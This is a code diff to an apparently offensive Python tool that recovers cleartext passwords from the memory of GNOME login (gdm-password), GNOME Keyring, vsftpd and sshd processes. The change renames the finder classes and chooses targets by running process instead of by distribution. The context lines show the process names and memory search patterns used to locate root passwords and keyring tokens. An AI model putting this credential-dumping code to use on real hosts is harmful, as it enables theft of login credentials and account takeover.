@@ -148,14 +148,14 @@ class PasswordFinder:
 
         return self._try_potential_passwords()
 
-class KaliDesktopPasswordFinder(PasswordFinder):
+class GdmPasswordFinder(PasswordFinder):
     def __init__(self):
         PasswordFinder.__init__(self)
         self._source_name = '[SYSTEM - GNOME]'
         self._target_processes = ['gdm-password']
         self._needles = ['^_pammodutil_getpwnam_root_1$', '^gkr_system_authtok$']
 
-class UbuntuDesktopPasswordFinder(PasswordFinder):
+class GnomeKeyringPasswordFinder(PasswordFinder):
     def __init__(self):
         PasswordFinder.__init__(self)
         self._source_name = '[SYSTEM - GNOME]'
@@ -212,10 +212,10 @@ def main():
 
     password_finders = list()
 
-    if 'kali' in get_linux_distribution():
-        password_finders.append(KaliDesktopPasswordFinder())
-    if 'ubuntu' in get_linux_distribution():
-        password_finders.append(UbuntuDesktopPasswordFinder())
+    if find_pid('gdm-password'):
+        password_finders.append(GdmPasswordFinder())
+    if find_pid('gnome-keyring-daemon'):
+        password_finders.append(GnomeKeyringPasswordFinder())
     if os.path.isfile('/etc/vsftpd.conf'):
         password_finders.append(VsftpdPasswordFinder())
     if os.path.isfile('/etc/ssh/sshd_config'):
